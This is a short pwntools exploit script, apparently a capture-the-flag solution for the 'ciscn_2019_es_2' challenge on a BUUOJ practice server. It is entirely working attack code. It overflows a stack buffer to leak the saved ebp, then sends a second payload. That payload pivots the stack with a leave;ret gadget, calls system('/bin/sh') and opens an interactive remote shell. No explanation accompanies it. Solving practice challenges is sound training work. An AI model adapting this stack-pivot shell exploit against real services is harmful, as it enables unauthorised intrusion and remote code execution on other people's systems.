from pwn import *
#sh = process("./ciscn_2019_es_2")
sh = remote("node5.buuoj.cn",26619)
elf = ELF("./ciscn_2019_es_2")
leave_ret = 0x08048562
system_addr = 0x08048400
payload1 = b'a'*0x26+b'b'*2
sh.send(payload1)
sh.recvuntil(b'bb')
edp = u32(sh.recv(4))
print(hex(edp))
payload2 = b'a'*0x4+p32(system_addr)+b'bbbb'+p32(edp-0x28)+b'/bin/sh\x00'
payload2 = payload2.ljust(0x28,b'\x00')
payload2 = payload2 + p32(edp-0x38) + p32(leave_ret)
sh.sendline(payload2)
sh.interactive()
